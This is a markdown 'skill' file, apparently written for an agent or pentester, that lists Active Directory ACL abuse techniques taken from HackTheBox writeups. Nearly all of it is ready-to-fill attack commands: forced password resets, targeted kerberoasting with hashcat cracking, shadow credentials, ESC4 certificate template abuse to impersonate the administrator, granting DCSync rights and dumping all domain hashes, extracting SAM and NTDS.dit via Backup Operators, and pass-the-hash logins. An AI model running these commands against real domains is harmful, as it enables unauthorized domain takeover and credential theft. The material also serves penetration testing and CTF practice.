---
name: acl-abuse
description: AD ACL/ACE abuse based on 0xdf writeups of Administrator, TombWatcher, Vintage, Fluffy, Rebound, Forest, EscapeTwo, Mist, DarkCorp.
---

# ACL Abuse

## Identify ACL edges
```bash
# BloodHound: check "Outbound Object Control" for owned users
# PowerView (from Windows shell):
Get-ObjectAcl -Identity {TARGET} -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteOwner|WriteDacl"}
```

## GenericAll over user
Full control — choose based on what you need:
```bash
# Option 1: change password (noisiest)
bloodyAD -u '{USER}' -p '{PASS}' -d {DOMAIN} --host {IP} set password {TARGET} 'NewPass123!'

# Option 2: targeted kerberoast (stealthier)
bloodyAD -u '{USER}' -p '{PASS}' -d {DOMAIN} --host {IP} set object {TARGET} servicePrincipalName -v 'fake/spn'
netexec ldap {IP} -u '{USER}' -p '{PASS}' --kerberoasting kerb.txt
bloodyAD -u '{USER}' -p '{PASS}' -d {DOMAIN} --host {IP} set object {TARGET} servicePrincipalName  # remove after
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt

# Option 3: shadow credential (best if ADCS present)
certipy shadow auto -u '{USER}@{DOMAIN}' -p '{PASS}' -account {TARGET} -dc-ip {IP}
# → returns NT hash directly
```

## GenericWrite over user
```bash
# Targeted kerberoast (add SPN)
bloodyAD -u '{USER}' -p '{PASS}' -d {DOMAIN} --host {IP} set object {TARGET} servicePrincipalName -v 'fake/spn'
# Shadow credential
certipy shadow auto -u '{USER}@{DOMAIN}' -p '{PASS}' -account {TARGET} -dc-ip {IP}
```

## WriteSPN
```bash
bloodyAD -u '{USER}' -p '{PASS}' -d {DOMAIN} --host {IP} set object {TARGET} servicePrincipalName -v 'fake/spn'
netexec ldap {IP} -u '{USER}' -p '{PASS}' --kerberoasting kerb.txt
hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt
# Remove SPN after cracking
bloodyAD -u '{USER}' -p '{PASS}' -d {DOMAIN} --host {IP} set object {TARGET} servicePrincipalName
```

## ForceChangePassword
```bash
bloodyAD -u '{USER}' -p '{PASS}' -d {DOMAIN} --host {IP} set password {TARGET} 'NewPass123!'
# Check if account disabled first
bloodyAD -u '{USER}' -p '{PASS}' -d {DOMAIN} --host {IP} get object {TARGET} | grep -i userAccountControl
# Enable account (512=normal, 514=disabled)
bloodyAD -u '{USER}' -p '{PASS}' -d {DOMAIN} --host {IP} set object {TARGET} userAccountControl -v 512
```

## WriteOwner
```bash
# Take ownership then grant GenericAll
bloodyAD -u '{USER}' -p '{PASS}' -d {DOMAIN} --host {IP} set owner {TARGET_OBJ} {USER}
bloodyAD -u '{USER}' -p '{PASS}' -d {DOMAIN} --host {IP} add genericAll {TARGET_OBJ} {USER}
```

## WriteOwner / GenericAll over ADCS template → ESC4
```bash
# Modify template to make it ESC1-vulnerable then exploit
certipy template -u '{USER}@{DOMAIN}' -p '{PASS}' -dc-ip {IP} -template '{TEMPLATE}' -save-old
certipy template -u '{USER}@{DOMAIN}' -p '{PASS}' -dc-ip {IP} -template '{TEMPLATE}' -configuration {TEMPLATE}.json
certipy req -u '{USER}@{DOMAIN}' -p '{PASS}' -ca '{CA}' -template '{TEMPLATE}' -upn administrator@{DOMAIN} -dc-ip {IP}
certipy auth -pfx administrator.pfx -dc-ip {IP}
# Restore template after
certipy template -u '{USER}@{DOMAIN}' -p '{PASS}' -dc-ip {IP} -template '{TEMPLATE}' -configuration {TEMPLATE}.json.bak
```

## WriteDACL on domain object → DCSync (Forest pattern)
```bash
# Add DCSync rights to yourself
impacket-dacledit -action write -rights DCSync -principal '{USER}' -target-dn 'DC={DOMAIN},DC={TLD}' '{DOMAIN}/{USER}:{PASS}'
impacket-secretsdump {DOMAIN}/{USER}:'{PASS}'@{IP} -just-dc
```

## AddSelf / AddMember
```bash
bloodyAD -u '{USER}' -p '{PASS}' -d {DOMAIN} --host {IP} add groupMember '{GROUP}' {USER}
```

## ReadGMSAPassword
```bash
netexec ldap {IP} -u '{USER}' -p '{PASS}' --gmsa
# → NTLM hash of GMSA account
evil-winrm -i {IP} -u '{GMSA_ACCOUNT}$' -H {NT_HASH}
```

## AddKeyCredentialLink (shadow credential manually)
```bash
# Requires GenericWrite over target
certipy shadow add -u '{USER}@{DOMAIN}' -p '{PASS}' -account {TARGET} -dc-ip {IP}
certipy shadow auth -u '{USER}@{DOMAIN}' -p '{PASS}' -account {TARGET} -dc-ip {IP}
```

## Backup Operators → NTDS.dit (Cicada pattern)
```bash
# On Windows shell as Backup Operators member:
# Method 1: reg save
reg save HKLM\SAM C:\Temp\sam
reg save HKLM\SYSTEM C:\Temp\system
# Exfil and crack:
impacket-secretsdump -sam sam -system system LOCAL

# Method 2: diskshadow + robocopy
diskshadow /s C:\Temp\shadow.txt    # script: set context persistent; add volume c: alias 0xdf; create; expose %0xdf% z:
robocopy /b Z:\Windows\NTDS C:\Temp ntds.dit
# Exfil NTDS + SYSTEM → secretsdump
impacket-secretsdump -ntds ntds.dit -system system LOCAL
```

## Exchange Windows Permissions → WriteDACL → DCSync (Forest pattern)
```bash
# If user is in Account Operators → can add to Exchange Windows Permissions group
net group "Exchange Windows Permissions" {USER} /add /domain
# Then grant DCSync via PowerView:
$pass = ConvertTo-SecureString '{PASS}' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('{DOMAIN}\{USER}', $pass)
Add-ObjectACL -PrincipalIdentity '{USER}' -Credential $cred -Rights DCSync
```

## DCSync
```bash
impacket-secretsdump {DOMAIN}/{USER}:'{PASS}'@{IP} -just-dc
impacket-secretsdump {DOMAIN}/{USER}@{IP} -hashes :{NT_HASH} -just-dc
impacket-secretsdump {DOMAIN}/{USER}:'{PASS}'@{IP} -just-dc-user administrator
```